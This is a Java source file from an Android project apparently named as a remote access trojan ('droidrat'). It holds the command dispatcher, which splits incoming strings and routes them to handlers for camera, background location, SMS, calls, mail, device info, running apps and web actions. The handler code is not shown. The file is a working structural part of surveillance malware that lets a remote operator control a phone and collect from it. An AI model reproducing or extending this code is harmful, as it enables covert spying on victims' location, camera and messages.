package com.je_chen.droidrat_je.rat.command.process_super;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.SensorManager;
import android.location.LocationManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.je_chen.droidrat_je.command.CallCommand;
import com.je_chen.droidrat_je.command.CameraCommand;
import com.je_chen.droidrat_je.command.InfoCommand;
import com.je_chen.droidrat_je.command.LocationCommand;
import com.je_chen.droidrat_je.command.MailCommand;
import com.je_chen.droidrat_je.command.PlayCommand;
import com.je_chen.droidrat_je.command.RunAppCommand;
import com.je_chen.droidrat_je.command.SMSCommand;
import com.je_chen.droidrat_je.command.SensorCommand;
import com.je_chen.droidrat_je.command.VibratorCommand;
import com.je_chen.droidrat_je.command.WebCommand;


public class CommandProcess {

    private final String TAG = "CommandProcess ";

    private CommandFather commandFather;

    private PackageManager packageManager;

    private SensorManager sensorManager;

    private Context context;

    private CallCommand callCommand;

    private CameraCommand cameraCommand;

    private InfoCommand infoCommand;

    private LocationCommand locationCommand;

    private MailCommand mailCommand;

    private PlayCommand playCommand;

    private RunAppCommand runAppCommand;

    private SensorCommand sensorCommand;

    private SMSCommand smsCommand;

    private VibratorCommand vibratorCommand;

    private WebCommand webCommand;


    private CommandProcess() {
        this.commandFather = new CommandFather();
        this.mailCommand = new MailCommand();
        this.playCommand = new PlayCommand();
        this.smsCommand = new SMSCommand();
    }

    public CommandProcess(Context context, PackageManager packageManager, SensorManager sensorManager, LocationManager locationManager, String type, int sec, int meter) {
        this();

        this.context = context;
        this.packageManager = packageManager;
        this.sensorManager = sensorManager;

        this.callCommand = new CallCommand(context);
        this.cameraCommand = new CameraCommand(context);
        this.infoCommand = new InfoCommand(packageManager, context);
        this.runAppCommand = new RunAppCommand(packageManager);
        this.sensorCommand = new SensorCommand(sensorManager);
        this.vibratorCommand = new VibratorCommand(context);
        this.webCommand = new WebCommand(context);

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            this.locationCommand = new LocationCommand(context, locationManager, type, sec, meter);
        }

    }

    public void processString(String rawString) {
        try {
            String[] rawStringArray = rawString.split(" ");
            if (rawStringArray.length > 1) {
                this.processCommands(rawStringArray[0], rawString);
                Log.d(TAG, " Process String " + rawStringArray[0] + " / " + rawString);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void processCommands(@NonNull String type, String command) {
        switch (type) {
            case "Call":
                Log.d(TAG, "Call");
                this.commandFather = callCommand;
                this.commandFather.processCommand(command);
                break;

            case "Camera":
                Log.d(TAG, "Camera");
                this.commandFather = cameraCommand;
                this.commandFather.processCommand(command);
                break;

            case "Info":
                Log.d(TAG, "Info");
                this.commandFather = infoCommand;
                this.commandFather.processCommand(command);
                break;

            case "Location":
                Log.d(TAG, "Location");
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    this.commandFather = locationCommand;
                    this.commandFather.processCommand(command);
                }
                break;

            case "Mail":
                Log.d(TAG, "Mail");
                this.commandFather = mailCommand;
                this.commandFather.processCommand(command);
                break;

            case "Play":
                Log.d(TAG, "Play");
                this.commandFather = playCommand;
                this.commandFather.processCommand(command);
                break;

            case "RunApp":
                Log.d(TAG, "RunApp");
                this.commandFather = runAppCommand;
                this.commandFather.processCommand(command);
                break;

            case "Sensor":
                Log.d(TAG, "Sensor");
                this.commandFather = sensorCommand;
                this.commandFather.processCommand(command);
                break;

            case "SMS":
                Log.d(TAG, "SMS");
                this.commandFather = smsCommand;
                this.commandFather.processCommand(command);
                break;

            case "Vibrator":
                Log.d(TAG, "Vibrator");
                this.commandFather = vibratorCommand;
                this.commandFather.processCommand(command);
                break;

            case "Web":
                Log.d(TAG, "Web");
                this.commandFather = webCommand;
                this.commandFather.processCommand(command);
                break;
        }
    }

}
